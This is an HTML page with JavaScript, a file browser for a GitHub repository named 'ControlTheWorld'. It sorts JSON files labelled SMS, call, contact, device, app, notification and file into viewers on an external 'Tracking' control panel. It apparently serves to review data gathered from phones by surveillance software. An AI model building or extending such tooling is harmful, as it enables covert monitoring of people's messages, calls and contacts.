<!DOCTYPE html><html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ControlTheWorld File Browser</title><link rel="stylesheet" href="styles.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"><style>
body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: #0f172a;
    color: white;
}

.container {
    display: flex;
    height: 100vh;
}

.sidebar {
    width: 300px;
    background: #020617;
    padding: 15px;
    overflow-y: auto;
}

.content {
    flex: 1;
    padding: 20px;
}

.folder, .file {
    padding: 8px;
    cursor: pointer;
    border-radius: 6px;
}

.folder:hover, .file:hover {
    background: #1e293b;
}

.viewer-options button {
    margin: 5px;
    padding: 10px;
    cursor: pointer;
    border-radius: 6px;
    border: none;
    background: #2563eb;
    color: white;
}
</style></head>
<body><div class="container"><div class="sidebar">
<h2>ControlTheWorld</h2>
<div id="fileList"></div>
</div><div class="content">
<div id="viewerOptions" class="viewer-options"></div>
</div></div><script>

/* ==========================================
CONFIG
========================================== */

const owner = "MOFO-UG";
const repo = "ControlTheWorld";

const BASE_VIEWER_URL =
"https://rahulpuri.fun/RKP-ControlPanel/Tracking/";

let defaultBranch = "main";
let currentFilePath = "";
let currentFileName = "";


/* ==========================================
INIT
========================================== */

document.addEventListener("DOMContentLoaded", init);

async function init()
{
    try
    {
        const repoResponse =
        await fetch(`https://api.github.com/repos/${owner}/${repo}`);

        const repoData = await repoResponse.json();

        defaultBranch = repoData.default_branch || "main";

        loadContents("");

    }
    catch
    {
        showError("GitHub connection failed");
    }
}


/* ==========================================
LOAD DIRECTORY
========================================== */

async function loadContents(path)
{
    try
    {

        const response =
        await fetch(
        `https://api.github.com/repos/${owner}/${repo}/contents/${path}?ref=${defaultBranch}`
        );

        const data = await response.json();

        const fileList =
        document.getElementById("fileList");

        fileList.innerHTML = "";


        if(path !== "")
        {
            const back = document.createElement("div");

            back.className = "folder";

            back.textContent = ".. (Back)";

            back.onclick = () =>
            {
                const parts = path.split("/");
                parts.pop();
                loadContents(parts.join("/"));
            };

            fileList.appendChild(back);
        }


        data.forEach(item =>
        {

            const div =
            document.createElement("div");

            div.textContent = item.name;

            div.className =
            item.type === "dir"
            ? "folder"
            : "file";


            if(item.type === "dir")
            {
                div.onclick =
                () => loadContents(item.path);
            }

            else if(item.name.endsWith(".json"))
            {
                div.onclick =
                () =>
                {
                    currentFilePath = item.path;
                    currentFileName = item.name;

                    generateViewerButtons(item.name);
                };
            }

            fileList.appendChild(div);

        });

    }
    catch
    {
        showError("Directory load failed");
    }
}


/* ==========================================
VIEWER DETECTION
========================================== */

function detectViewerType(filename)
{
    const lower = filename.toLowerCase();

    if(lower.startsWith("sms")) return "Sms";

    if(lower.startsWith("call")) return "Call";

    if(lower.startsWith("contact")) return "Contact";

    if(lower.startsWith("device")) return "Device";

    if(lower.startsWith("app")) return "App";

    if(lower.startsWith("notification")) return "Notification";

    if(lower.startsWith("file")) return "FileManager";

    return null;
}


/* ==========================================
GENERATE BUTTONS
========================================== */

function generateViewerButtons(filename)
{
    const container =
    document.getElementById("viewerOptions");

    container.innerHTML = "";

    const detected =
    detectViewerType(filename);


    if(detected)
    addButton(
        detected,
        "Open in " + detected + " Viewer"
    );


    addButton(
        "Regular",
        "Open in Regular Viewer"
    );


    if(!detected)
    {
        addButton("Sms","Open SMS Viewer");

        addButton("Call","Open Call Viewer");

        addButton("Contact","Open Contacts Viewer");

        addButton("Device","Open Device Viewer");

        addButton("App","Open App Viewer");

        addButton("Notification","Open Notification Viewer");

        addButton("FileManager","Open File Manager Viewer");
    }


    const auto =
    detected || "Regular";

    setTimeout(() =>
    {
        redirectToViewer(auto);
    }, 200);
}


/* ==========================================
ADD BUTTON
========================================== */

function addButton(type,label)
{
    const btn =
    document.createElement("button");

    btn.textContent = label;

    btn.onclick =
    () => redirectToViewer(type);

    document
    .getElementById("viewerOptions")
    .appendChild(btn);
}


/* ==========================================
REDIRECT ENGINE
========================================== */

function redirectToViewer(type)
{

    if(!currentFilePath) return;

    const rawURL =
    `https://raw.githubusercontent.com/${owner}/${repo}/${defaultBranch}/${currentFilePath}`;


    let paramKey = "url";


    if(type === "App"
    || type === "Contact"
    || type === "Call"
    || type === "Regular")
    {
        paramKey = "github";
    }


    const finalURL =
    `${BASE_VIEWER_URL}${type}?${paramKey}=${encodeURIComponent(rawURL)}`;


    window.location.href =
    finalURL;

}


/* ==========================================
ERROR UI
========================================== */

function showError(msg)
{
    const fileList =
    document.getElementById("fileList");

    fileList.innerHTML =
    "<div style='color:red'>"+msg+"</div>";
}

</script></body>
</html>
